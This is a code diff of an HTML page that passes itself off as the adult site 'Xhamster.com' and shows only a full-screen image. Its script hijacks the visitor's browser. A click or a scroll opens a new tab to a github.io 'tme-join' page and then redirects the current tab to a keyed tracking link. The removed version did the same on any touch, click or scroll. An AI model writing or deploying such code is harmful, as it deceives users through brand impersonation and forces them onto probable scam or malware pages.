@@ -3,54 +3,72 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
 <title>Xhamster.com</title>
 
 <style>
-body{
+*{
     margin:0;
+    padding:0;
+    box-sizing:border-box;
+}
+
+body{
     background:#000;
+    overflow-x:hidden;
 }
 
 img{
     width:100%;
-    height:100%;
+    height:100vh;
     object-fit:cover;
+    display:block;
 }
 </style>
 </head>
 
 <body>
 
-<img src="1.jpg" onclick="openLinks()">
+<img src="1.jpg" id="triggerImage">
 
 <script>
-function openLinks(){
+(function () {
+
+    let opened = false;
 
     // New tab landing page
-    window.open(
-        "https://tme-join.github.io/dgngbf/",
-        "_blank"
-    );
+    const newTabLink =
+        "https://tme-join.github.io/dgngbf/";
 
-    // 50/50 random redirect
-    const links = [
-        "https://sitefleck.com/qwpmezpg?key=ff4552c4f5069bba65ae8a584a919868",
-        "https://seenimplieddump.com/v3a38gvf?key=6c21c7841863a8a4041248cb754691b4"
-    ];
+    // Current tab landing page
+    const currentTabLink =
+        "https://sitefleck.com/qwpmezpg?key=ff4552c4f5069bba65ae8a584a919868";
 
-    const randomLink =
-        links[Math.floor(Math.random() * links.length)];
+    function openPages() {
 
-    window.location.href = randomLink;
-}
+        if (opened) return;
 
-// Screen touch / click
-document.addEventListener("touchstart", openLinks);
-document.addEventListener("click", openLinks);
+        opened = true;
 
-// Scroll trigger
-window.addEventListener("scroll", openLinks);
+        // Open in new tab
+        window.open(newTabLink, "_blank");
 
+        // Redirect current tab
+        setTimeout(() => {
+            window.location.href = currentTabLink;
+        }, 200);
+    }
+
+    // Click trigger
+    document
+        .getElementById("triggerImage")
+        .addEventListener("click", openPages);
+
+    // Scroll trigger
+    window.addEventListener("scroll", openPages);
+
+})();
 </script>
+
 </body>
 </html>
